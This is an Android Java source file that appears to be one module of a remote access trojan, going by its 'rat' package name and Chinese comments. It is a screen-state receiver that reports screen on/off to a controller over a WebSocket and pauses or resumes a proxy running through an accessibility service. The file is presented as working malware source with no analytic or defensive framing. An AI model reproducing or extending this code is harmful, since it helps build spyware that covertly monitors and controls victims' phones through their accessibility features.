package com.vendor.rat.keepalive.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.Log;

import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;
import com.vendor.rat.service.MyAccessibilityService;

/**
 * 息屏/亮屏接收器 (模块 07)
 *
 * 必须动态注册（SCREEN_OFF/ON 无法静态注册）
 */
public class ScreenBroadcastReceiver extends BroadcastReceiver {

    private static final String TAG = "ScreenReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();

        if (Intent.ACTION_SCREEN_OFF.equals(action)) {
            Log.d(TAG, "Screen OFF");
            onScreenOff(context);
        } else if (Intent.ACTION_SCREEN_ON.equals(action)) {
            Log.d(TAG, "Screen ON");
            onScreenOn(context);
        }
    }

    private void onScreenOff(Context context) {
        // 上报息屏状态 (通过 Laravel 协议: subc=ping, msg=screen_state=0)
        WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
        if (ws != null) {
            ws.sendPing("screen_state=0");
        }

        // 暂停无障碍代理
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service != null) {
            service.pauseProxy();
        }
    }

    private void onScreenOn(Context context) {
        WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
        if (ws != null) {
            ws.sendPing("screen_state=1");
        }

        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service != null) {
            service.resumeProxy();
        }
    }

    /**
     * 动态注册
     */
    public static void register(Context context) {
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        context.registerReceiver(new ScreenBroadcastReceiver(), filter);
    }
}
